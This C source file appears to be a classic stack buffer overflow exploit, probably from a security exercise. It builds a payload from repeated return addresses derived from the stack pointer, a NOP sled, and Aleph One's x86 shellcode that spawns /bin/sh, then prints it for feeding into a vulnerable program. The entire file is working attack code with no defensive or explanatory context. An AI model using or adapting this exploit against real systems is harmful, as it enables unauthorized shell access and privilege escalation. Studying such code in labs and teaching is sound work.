/*
*  Aleph's shellcode
* use default 198 since it will overwrite first few with "EGG= "
*/

#include <stdlib.h>

#define DEFAULT_OFFSET                    0
#define DEFAULT_BUFFER_SIZE             500
#define NOP                            0x90

char shellcode[] =
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh";

unsigned long get_sp(void) {
   __asm__("movl %esp,%eax");
}

void main(int argc, char *argv[]) {
  char *buff, *ptr;
  long *addr_ptr, addr;
  int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
  int i;

  if (argc > 1) bsize  = atoi(argv[1]);
  if (argc > 2) offset = atoi(argv[2]);

  if (!(buff = malloc(bsize))) {
    printf("Can't allocate memory.\n");
    exit(0);
  }

  addr = get_sp() + 193 - offset;
  // printf("Using address: 0x%x\n", addr);

  ptr = buff;
  addr_ptr = (long *) ptr;
  //fill with addrs
  for (i = 0; i < 192; i+=4)
    *(addr_ptr++) = addr;

  buff[192] = 0x00; //overwriter

  //make a bunch of nops
  for (i = 193; i < 293; i++)
    buff[i] = NOP;

  for (i = 0; i < strlen(shellcode); i++)
    buff[293 + i] = shellcode[i];

  //buff[bsize - 1] = '\0';
  printf(buff);

  // memcpy(buff,"EGG=",4);
  // putenv(buff);
  // system("/bin/bash");
}